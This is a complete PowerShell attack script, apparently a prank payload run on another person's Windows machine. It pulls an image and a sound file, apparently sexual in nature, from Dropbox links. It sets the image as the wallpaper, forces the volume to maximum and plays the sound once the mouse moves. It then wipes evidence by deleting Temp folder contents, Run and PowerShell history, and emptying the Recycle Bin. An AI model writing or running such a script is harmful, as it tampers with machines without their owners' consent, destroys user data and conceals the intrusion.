$image =  "https://www.dropbox.com/s/52pxwg8lxv1gmht/hen.jpg"

$i = -join($image,"?dl=1")
iwr $i -O $env:TMP\i.png

# Download WAV file; replace link to $wav to add your own sound

$wav = "https://www.dropbox.com/s/29rqku40i74jk1x/y2matehentai.wav"


$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

#----------------------------------------------------------------------------------------------------

<#
.NOTES 
	This will take the image you downloaded and set it as the targets wall paper
#>

Function Set-WallPaper {
 
$MyWallpaper="$env:TMP\i.png"
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@

add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
}


<#
.NOTES 
	This is to pause the script until a mouse movement is detected
#>



function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

<#
.NOTES 
	This is to play the WAV file
#>

function Play-WAV{
$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
}

#----------------------------------------------------------------------------------------------------

# This turns the volume up to max level
Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
Set-Speaker -Volume 50

#----------------------------------------------------------------------------------------------------

Pause-Script
Set-WallPaper
Play-WAV

#----------------------------------------------------------------------------------------------------

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# This script repeatedly presses the capslock button, this snippet will make sure capslock is turned back off

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
